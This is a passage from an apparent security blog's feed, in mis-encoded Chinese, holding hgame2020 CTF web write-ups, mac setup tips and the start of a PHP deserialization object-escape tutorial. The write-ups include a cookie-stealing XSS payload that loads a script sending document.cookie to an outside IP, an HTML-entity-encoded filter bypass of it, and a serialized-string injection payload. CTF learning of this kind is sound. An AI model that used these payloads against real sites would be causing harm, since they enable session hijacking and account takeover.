class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘é€postè¯·æ±‚å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $post_data = <span class="string">''</span>, $timeout = <span class="number">5</span>)</span></span>&#123;<span class="comment">//curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>($post_data != <span class="string">''</span>)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    $file_contents = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $file_contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ›¿æ¢æ•°ç»„ä¸­çš„å…ƒç´ </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arrContentReplact</span><span class="params">($array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($array))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            $array[$k] = arrContentReplact($array[$k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $array = str_replace(<span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'encrypt'</span>,<span class="string">'base64_encode'</span>), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">'decrypt'</span>,<span class="string">'base64_decode'</span>), $array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–åŠ å¯†çš„tokenå­—ç¬¦ä¸²</span></span><br><span class="line">$text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/'</span>);</span><br><span class="line">$re = <span class="string">'/&lt;\/code&gt;&lt;br&gt;(.+)&lt;br&gt;/msx'</span>;</span><br><span class="line">preg_match_all($re, $text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$str = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–codeä»£ç ï¼Œæå–å…¶ä¸­çš„åŠ å¯†å‡½æ•°ï¼ŒåŠ å¯†å‡½æ•°ä¼šä¸€ç›´å˜</span></span><br><span class="line">$code_text = file_get_contents(<span class="string">'http://ffddf97958.php.hgame.n3ko.co/mycode'</span>);</span><br><span class="line">$re = <span class="string">'/echo\((.+)\$_SERVER.+if/msx'</span>;</span><br><span class="line">preg_match_all($re, $code_text, $matches, PREG_SET_ORDER, <span class="number">0</span>);</span><br><span class="line">$code = $matches[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">$payload = explode(<span class="string">'('</span>,$code);  <span class="comment">//æŠŠåŠ å¯†å‡½æ•°ä»¥(åˆ†å‰²</span></span><br><span class="line">$payload = array_filter($payload);  <span class="comment">//åˆ é™¤æ•°ç»„ä¸­çš„ç©ºå€¼</span></span><br><span class="line">$payload = arrContentReplact($payload);  <span class="comment">//è°ƒç”¨æ›¿æ¢æ•°ç»„ä¸­çš„å…ƒç´ </span></span><br><span class="line">$payload = array_reverse($payload);  <span class="comment">//æ•°ç»„ä¸­çš„å…ƒç´ é€†ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠé€†ç½®åçš„å…ƒç´ æ‹¼æ¥èµ·æ¥</span></span><br><span class="line">$payload_str = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($payload <span class="keyword">as</span> $v)&#123;</span><br><span class="line">    $payload_str .=( $v.<span class="string">'('</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€†å‘è§£å‡ºtoken</span></span><br><span class="line"><span class="keyword">eval</span>((<span class="string">'$token='</span>.$payload_str.<span class="string">'$str'</span>.str_repeat(<span class="string">')'</span>,<span class="number">10</span>).<span class="string">';'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‘é€postè¯·æ±‚</span></span><br><span class="line"><span class="keyword">echo</span> post(<span class="string">'http://ffddf97958.php.hgame.n3ko.co'</span>,<span class="string">'token='</span>.$token);</span><br></pre></td></tr></table></figure><h2 id="Cosmosçš„èŠå¤©å®¤-è¿™é¢˜æ˜¯èµ›åå¤ç°çš„"><a href="#Cosmosçš„èŠå¤©å®¤-è¿™é¢˜æ˜¯èµ›åå¤ç°çš„" class="headerlink" title="Cosmosçš„èŠå¤©å®¤(è¿™é¢˜æ˜¯èµ›åå¤ç°çš„)"></a>Cosmosçš„èŠå¤©å®¤(è¿™é¢˜æ˜¯èµ›åå¤ç°çš„)</h2><p>é¦–å…ˆè¿›è¡Œfuzzï¼Œè¿™é‡Œè¿‡æ»¤äº†<code>&lt;&gt;</code>ä¸­çš„å†…å®¹ã€<code>script</code>ã€<code>iframe</code>ç­‰ï¼Œå¹¶ä¸”æ‰€æœ‰å­—æ¯ä¼šè¢«å¤§å†™</p><p>4.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;http://118.25.36.154:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure><p>åŸå§‹payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://118.25.36.154/4.js&apos;;//</span><br></pre></td></tr></table></figure><p>ç”±äºå°–æ‹¬å·ä¸èƒ½ä¸¤ä¸ªåŒæ—¶å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>&lt;</code>ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬é—­åˆã€‚å‡½æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨htmlç¼–ç ç»•è¿‡ã€‚</p><p><code>//</code>çš„åŸå› æ˜¯è¦æ³¨é‡Šæ‰æ’å…¥èŠå¤©æ¡†åçš„<code>&lt;span&gt;</code></p><p>bypass payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=S=&amp;#x63;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#x45;&amp;#x6c;&amp;#x65;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x22;&amp;#x29;&amp;#x3b;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x43;&amp;#x68;&amp;#x69;&amp;#x6c;&amp;#x64;&amp;#x28;&amp;#x53;&amp;#x29;&amp;#x3b;&amp;#x53;&amp;#x2e;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x31;&amp;#x38;&amp;#x2e;&amp;#x32;&amp;#x35;&amp;#x2e;&amp;#x33;&amp;#x36;&amp;#x2e;&amp;#x31;&amp;#x35;&amp;#x34;&amp;#x2f;&amp;#x34;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x22;&amp;#x2f;&amp;#x2f;</span><br></pre></td></tr></table></figure><p>ç„¶åncç›‘å¬</p><p><img src="http://images.xianyu123.club/Cosmos_chat1.png" alt></p><p>æœ€åæ›¿æ¢tokenå³å¯è·å¾—flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week2_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week1_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/</id>
    <published>2020-01-25T13:47:00.000Z</published>
    <updated>2020-01-25T13:55:03.656Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week1_Web_writeup</p><a id="more"></a><h1 id="Level-Week1"><a href="#Level-Week1" class="headerlink" title="Level - Week1"></a>Level - Week1</h1><h2 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h2><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯gitæ³„æ¼ï¼Œç„¶åéœ€è¦å›æ»šï¼Œå‘ç°å¹¶æ²¡æœ‰ï¼Œç„¶åå†æ¬¡è®¿é—®<code>.git/config</code>ï¼Œå‘ç°äº†ä¸€ä¸ª<code>github</code>åœ°å€</p><p><img src="http://images.xianyu123.club/cosmos1.png" alt></p><p>ç„¶åè·Ÿè¿›è®¿é—®è¿™ä¸ª<code>github</code>ï¼ŒæŸ¥çœ‹<code>commits</code>ï¼Œå‘ç°flagåœ¨è¿™é‡Œ</p><p><img src="http://images.xianyu123.club/cosmos2.png" alt></p><p>base64è§£ç <code>aGdhbWV7ZzF0X2xlQGtfMXNfZGFuZ2VyMHVzXyEhISF9</code>ï¼Œå¾—åˆ°flag<code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><h2 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h2><p>ä»é¢˜ç›®åå­—æ¥çœ‹å¯èƒ½æ˜¯æƒ³è®©æˆ‘ä»¬åœ¨headerå¤´ä¸­ä¼ å…¥ä¿¡æ¯ï¼Œæ‰“å¼€é¢˜ç›®åï¼Œé¢˜ç›®ä¸­è¯´<code>You need to come from https://vidar.club/.</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¢åŠ ä¸Š<code>Referer: https://vidar.club/</code></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œå¯èƒ½éœ€è¦locationè®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¢åŠ <code>X-Forwarded-For: 127.0.0.1</code></p><p><img src="http://images.xianyu123.club/jietou1.png" alt></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œéœ€è¦ç”¨<code>Cosmos</code>æµè§ˆå™¨è®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¢åŠ <code>User-Agent: Cosmos</code></p><p><img src="http://images.xianyu123.club/jietou2.png" alt></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œéœ€è¦åœ¨2077å¹´æ‰èƒ½è®¿é—®ï¼Œè¿™è®©æˆ‘æƒ³èµ·äº†ä¸­ç§‘å¤§2019çš„é‚£é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¢åŠ <code>if-unmodified-since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>å…·ä½“çš„ç”¨æ³•å¯å‚è€ƒ<a href="https://www.cnblogs.com/memset/p/http_if_modified_since.html" target="_blank" rel="noopener">HTTP/1.1 ä¸­ If-Modified-Since å’Œ If-Unmodified-Since åŒºåˆ«ç®€è®°</a></p><p><img src="http://images.xianyu123.club/jietou3.png" alt></p><p>ç„¶åå°±å¯ä»¥å¾—åˆ°flagäº†</p><p><img src="http://images.xianyu123.club/jietou4.png" alt></p><h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>è¿™é¢˜ç¡®å®æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œé—®äº†å­¦å¼Ÿå’Œå…¶ä»–ä¸¤ä¸ªå¸ˆå‚…æ‰æƒ³åˆ°ã€‚</p><p>é¦–å…ˆæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ª302è·³è½¬ï¼Œç„¶åæŠ“å–<code>index.php</code>çš„é¡µé¢ï¼Œæç¤º405é”™è¯¯</p><p><img src="http://images.xianyu123.club/code_world1.png" alt></p><p>è¿™ä¸ªä¸€èˆ¬éƒ½æ˜¯è¯·æ±‚æ–¹æ³•é”™è¯¯ï¼Œæ”¹æˆpostï¼Œæç¤ºéœ€è¦ä¼ å…¥aå‚æ•°</p><p><img src="http://images.xianyu123.club/code_world2.png" alt></p><p>ç„¶åä¼ å…¥å‚æ•°a=<code>2%2b8</code>ï¼ˆè¿™é‡Œç»è¿‡å¸ˆå‚…ä»¬çš„æé†’æ‰æƒ³èµ·æ¥ï¼‰ï¼Œ<code>+</code>åœ¨urlåœ°å€ä¸­æ˜¯ç©ºæ ¼ï¼Œéœ€è¦ç¼–ç æ‰èƒ½æ˜¾ç¤º<code>+</code></p><p><img src="http://images.xianyu123.club/code_world3.png" alt></p><h2 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h2><p>å…³é”®ä»£ç åœ¨<code>game.js</code>ä¸­çš„<code>gameOver()</code>å‡½æ•°ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gameOver() &#123;</span><br><span class="line"><span class="keyword">let</span> po = <span class="string">"ejIy"</span>;</span><br><span class="line"><span class="keyword">let</span> rt = po + <span class="string">"LmNj"</span>;</span><br><span class="line"><span class="keyword">let</span> rou = <span class="string">"L3N1Ym"</span>;</span><br><span class="line"><span class="keyword">let</span> sche = <span class="string">"aHR0c"</span>;</span><br><span class="line"><span class="keyword">let</span> k = <span class="string">"c2Nv"</span>;</span><br><span class="line"><span class="keyword">let</span> me = sche + <span class="string">"DovL2N"</span>;</span><br><span class="line">clearInterval(<span class="keyword">this</span>.timer)</span><br><span class="line"><span class="keyword">this</span>.context.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.canvas.width, <span class="keyword">this</span>.canvas.height)</span><br><span class="line"><span class="keyword">let</span> stamp = md5(<span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>()) / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="keyword">this</span>.globalScore + <span class="keyword">this</span>.storageScore;</span><br><span class="line"><span class="keyword">this</span>.context.font = <span class="string">'32px Microsoft YaHei'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillStyle = <span class="string">'#000'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillText(<span class="string">'CXKï¼Œä½ çƒæ‰äº†ï¼å¾—åˆ†ï¼š'</span> + <span class="keyword">this</span>.globalScore, <span class="number">404</span>, <span class="number">226</span>)</span><br><span class="line">$(<span class="string">"#ballspeedset"</span>).removeAttr(<span class="string">"disabled"</span>);</span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">this</span>.globalScore;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> getU = me + <span class="string">"4ay5oZ"</span>;</span><br><span class="line"><span class="keyword">let</span> rl = getU + <span class="string">"2FtZS53"</span>;</span><br><span class="line"><span class="keyword">let</span> te = rou + <span class="string">"1pdA"</span>;</span><br><span class="line"><span class="keyword">let</span> ey = k + <span class="string">"cmU="</span>;</span><br><span class="line">$.post(atob(rl + rt + te), atob(ey) + <span class="string">"="</span> + s + <span class="string">"|"</span> + stamp, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">alert(data);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬22è¡Œï¼Œè¿™é‡Œpostä¼ è¾“çš„ç½‘å€ä¸º<code>http://cxk.hgame.wz22.cc/submit</code>ï¼Œå‚æ•°åä¸º<code>score=</code>ï¼Œå‚æ•°å€¼ä¸º<code>åˆ†æ•°(å¤§äº30000)</code>ã€<code>|</code>ã€<code>stamp(åœ¨ç¬¬10è¡Œ)</code>ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç„¶åæ„é€ ä¼ è¾“å³å¯</p><p><img src="http://images.xianyu123.club/jntm1.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week1_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/%E8%A7%A3%E5%86%B3mac%E4%B8%8Bssh%E8%87%AA%E5%8A%A8%E4%B8%AD%E6%96%AD%E9%97%AE%E9%A2%98/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜/</id>
    <published>2020-01-14T11:20:45.000Z</published>
    <updated>2020-01-14T11:24:29.452Z</updated>
    
    <content type="html"><![CDATA[<p>è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜</p><a id="more"></a><h2 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h2><p>macä¸‹sshè¿æ¥ä¹‹åï¼Œå¦‚æœé•¿æ—¶é—´æ²¡æœ‰æ“ä½œï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨æ–­å¼€è¿™ä¸ªè¿æ¥ï¼Œä¹Ÿå°±æ˜¯sshå®¢æˆ·ç«¯ä¼šå¡ä½ï¼Œä¸èƒ½è¾“å…¥ã€‚</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>åœ¨<code>~/.ssh/config</code>ï¼ˆå¦‚æœæ²¡æœ‰<code>config</code>æ–‡ä»¶æ–°å»ºä¸€ä¸ªå³å¯ï¼‰ä¸­å†™å…¥ä¸‹é¢å†…å®¹ï¼Œä¿å­˜å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerAliveInterval 30</span><br></pre></td></tr></table></figure><p>æ¯éš”30ç§’ï¼Œmacå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘æœåŠ¡å™¨å‘å‡ºä¸€æ¬¡è¯·æ±‚ã€‚è¿™æ ·å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜äº†</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>macä¸‹å®‰è£…consolaså­—ä½“</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/mac%E4%B8%8B%E5%AE%89%E8%A3%85consolas%E5%AD%97%E4%BD%93/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/macä¸‹å®‰è£…consolaså­—ä½“/</id>
    <published>2020-01-14T10:30:31.000Z</published>
    <updated>2020-01-16T12:44:51.780Z</updated>
    
    <content type="html"><![CDATA[<p>macä¸‹å®‰è£…consolaså­—ä½“</p><a id="more"></a><h2 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h2><ol><li><code>mkdir consolas</code></li><li><code>cd consolas</code></li><li><code>curl -LO https://sourceforge.net/projects/mscorefonts2/files/cabs/PowerPointViewer.exe</code></li><li><code>cabextract PowerPointViewer.exe</code></li><li><code>cabextract ppviewer.cab</code></li><li><code>open CONSOLA*.TTF</code></li></ol><p>ç„¶åå°±å¯ä»¥å¿«ä¹çš„ä½¿ç”¨<code>consolas</code>å­—ä½“å•¦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macä¸‹å®‰è£…consolaså­—ä½“&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</title>
    <link href="http://0clickjacking0.github.io/2019/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/"/>
    <id>http://0clickjacking0.github.io/2019/12/17/phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸/</id>
    <published>2019-12-17T08:15:08.000Z</published>
    <updated>2019-12-18T13:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸çš„å­¦ä¹ </p><a id="more"></a><h1 id="phpä¸­çš„å‡ ä¸ªç‰¹æ€§"><a href="#phpä¸­çš„å‡ ä¸ªç‰¹æ€§" class="headerlink" title="phpä¸­çš„å‡ ä¸ªç‰¹æ€§"></a>phpä¸­çš„å‡ ä¸ªç‰¹æ€§</h1><ol><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œ<strong>å¯¹ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–</strong></li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape1.png" alt></p><ol start="2"><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>}</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</li><li>å¯¹äºç±»ä¼¼è¿™ç§<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;s:1:&quot;b&quot;;s:9:&quot;xianyu123&quot;;}s:1:&quot;c&quot;;s:2:&quot;yes&quot;;</code>ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–çš„ï¼Œå³ä½¿<code>s:2:&quot;yes&quot;</code>çš„é•¿åº¦ä¸åŒ¹é…ä¹Ÿä¸å½±å“ã€‚è¯´æ˜phpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªè¦æ±‚ä¸€ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²å—åˆæ³•å³å¯ï¼Œå½“ç„¶å¾—æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å—ã€‚</li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape2.png" alt></p><h1 id="æ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#æ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="æ¼æ´äº§ç”Ÿçš„åŸå› "></a>æ¼æ´äº§ç”Ÿçš„åŸå› </h1><p>åºåˆ—åŒ–çš„å­—ç¬¦ä¸²åœ¨ç»è¿‡è¿‡æ»¤å‡½æ•°ä¸æ­£ç¡®çš„å¤„ç†è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥ï¼Œå› ä¸ºå…ˆè¿›è¡Œäº†åºåˆ—åŒ–ï¼Œå†è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ­¤æ¼æ´ã€‚</p><h1 id="Demoæ¼”ç¤º"><a href="#Demoæ¼”ç¤º" class="headerlink" title="Demoæ¼”ç¤º"></a>Demoæ¼”ç¤º</h1><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">'bb'</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'user'</span>];</span><br><span class="line">$password = <span class="string">"mypass"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>user</code>å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å…ˆç»™å‡ºpayloadï¼š<code>xianyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}</code></p><p>ä»£ç ç¬¬4è¡Œï¼Œæ˜¯æŠŠ<code>c</code>æ›¿æ¢æˆä¸¤ä¸ª<code>b</code>ï¼Œè¿™æ ·çš„è¯æ¯æœ‰ä¸€ä¸ª<code>c</code>ï¼Œå°±å¯ä»¥å¤šå‡º1ä¸ªå­—ç¬¦ï¼Œç„¶åæˆ‘ä»¬çš„æ ¸å¿ƒä»£ç æ˜¯<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code>ï¼Œé•¿åº¦ä¸º20ï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦æ„é€ 20ä¸ª<code>c</code>å³å¯ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape4.png" alt></p><p>è¿™æ ·çš„è¯å°±å¯ä»¥è¦†ç›–æ‰æœ¬æ¥çš„<code>$password = &quot;mypass&quot;;</code>ï¼Œæ›¿æ¢æˆäº†æˆ‘ä»¬è‡ªå·±æƒ³è¦çš„å¯†ç ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape3.png" alt></p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>è¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸ªç¯å¢ƒï¼Œå°±æ˜¯å¦‚ä½•è¦†ç›–æ‰<code>$account[&#39;g&#39;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 